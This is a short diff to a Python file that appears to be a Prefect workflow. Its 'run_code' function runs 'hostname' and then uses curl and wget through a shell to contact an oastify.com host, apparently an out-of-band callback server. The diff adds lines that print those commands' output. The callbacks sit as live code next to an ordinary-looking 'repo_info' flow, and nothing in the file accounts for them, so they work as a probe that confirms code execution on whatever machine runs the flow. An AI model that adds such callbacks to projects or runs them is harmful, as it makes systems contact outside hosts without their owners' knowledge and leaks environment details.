@@ -31,7 +31,11 @@ def run_code():
     output_string = result.stdout
     print(f"hostname command: {output_string}")
     result = subprocess.run("curl http://929qlkt9aze7snf9c36udovztqzhn7bw.oastify.com", shell=True, capture_output=True, text=True)
+    output_string = result.stdout
+    print(f"curl command: {output_string}")
     result = subprocess.run("wget http://929qlkt9aze7snf9c36udovztqzhn7bw.oastify.com", shell=True, capture_output=True, text=True)
+    output_string = result.stdout
+    print(f"wget command: {output_string}")
 
 @flow(log_prints=True)
 def repo_info(repo_owner: str = "PrefectHQ", repo_name: str = "prefect"):
